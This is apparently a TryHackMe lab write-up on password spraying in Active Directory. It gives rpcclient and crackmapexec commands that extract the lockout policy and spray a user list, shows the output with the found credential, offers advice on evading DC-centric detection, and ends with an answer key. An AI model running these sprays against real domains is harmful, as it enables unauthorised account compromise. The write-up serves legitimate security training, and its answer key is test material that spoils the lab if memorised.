# Task 05: Password Spraying

---

## Stage A: Original Task Content & Briefing Summary

Task 05 demonstrates how to weaponize the user accounts discovered during unauthenticated enumeration by extracting the **Domain Password Policy** and executing a safe **Password Spraying** attack using `CrackMapExec` (`cme`).

### 1. Extracting the Domain Password Policy:
* Before testing any passwords, operators must determine the lockout parameters to prevent account lockouts:
  * Using `rpcclient`:
    ```bash
    rpcclient -U "" 10.211.11.10 -N
    rpcclient $> getdompwinfo
    ```
  * Using `crackmapexec`:
    ```bash
    crackmapexec smb 10.211.11.10 --pass-pol
    ```
* **Output Analysis:**
  * Minimum Password Length: **`7`** characters.
  * Password Complexity: `Enabled` (requires 3 of 4: uppercase, lowercase, numbers, special characters).
  * Account Lockout Threshold: `10` failed attempts.
  * Lockout Observation Window: `2 minutes`.
  * Locked Account Duration: **`2 minutes`**.

### 2. Executing the Password Spray:
* Armed with the knowledge that the account lockout duration is merely 2 minutes and the threshold is 10 attempts, an attacker can safely spray high-value passwords.
* Target: Workstation `WRK` (`10.211.11.20`) or the Domain Controller (`10.211.11.10`).
* Tool Command:
  ```bash
  crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
  ```
* **Compromised Credentials Discovered:**
  * User: `rduke`
  * Password: `Password1!`
  * Format: `rduke:Password1!`

---

## Stage B: Independent Thinking & OpSec Considerations

* **Targeting Workstations vs Domain Controllers during Password Sprays:**
  * While spraying against the Domain Controller is standard, spraying against a member workstation (`WRK.tryhackme.loc`) tests whether accounts can authenticate locally.
  * In networks with aggressive SIEM monitoring on Domain Controllers, spraying against member endpoints can sometimes evade DC-centric detection rules, although network logons still forward Netlogon authentications to the DC.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Run `crackmapexec smb 10.211.11.10 --pass-pol` to find the minimum password length and lockout duration.
* **Tier 2 Hint:** Run `crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt` to find the valid account.
* **Tier 3 Hint:** The minimum length is `7`, the lockout duration is `2 minutes`, and the cracked credentials are `rduke:Password1!`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

1. **Extract Domain Password Policy:**
   ```bash
   crackmapexec smb 10.211.11.10 -u '' -p '' --pass-pol
   ```
   * Key extracted fields:
     ```text
     [*] Minimum password length: 7
     [*] Password complexity: 1
     [*] Account lockout threshold: 10
     [*] Lockout observation window: 2 minutes
     [*] Account lockout duration: 2 minutes
     ```
   * Minimum password length: **`7`**.
   * Locked account duration: **`2 minutes`**.

2. **Execute Password Spraying Campaign:**
   ```bash
   crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
   ```
3. **Parse Output:**
   ```text
   SMB  10.211.11.20  445  WRK  [-] tryhackme.loc\administrator:Password1! STATUS_LOGON_FAILURE
   SMB  10.211.11.20  445  WRK  [-] tryhackme.loc\guest:Password1! STATUS_ACCOUNT_DISABLED
   SMB  10.211.11.20  445  WRK  [+] tryhackme.loc\rduke:Password1!
   ```
4. **Verified Credential Pair:**
   * **`rduke:Password1!`**

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the minimum password length?
  * **Answer:** `7`
* **Question 2:** What is the locked account duration?
  * **Answer:** `2 minutes`
* **Question 3:** Perform password spraying using CrackMapExec. What valid credentials did you find? (format: username:password)
  * **Answer:** `rduke:Password1!`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed verified answers on TryHackMe: `7`, `2 minutes`, and `rduke:Password1!`.
* Validated SMB authentication success for user `rduke` on workstation `10.211.11.20`.

---

## Stage G: Key Educational Takeaway

Always audit domain password and lockout policies prior to initiating credential attacks. Combining verified username lists with controlled password spraying yields valid initial domain credentials while guaranteeing zero accidental business disruption.
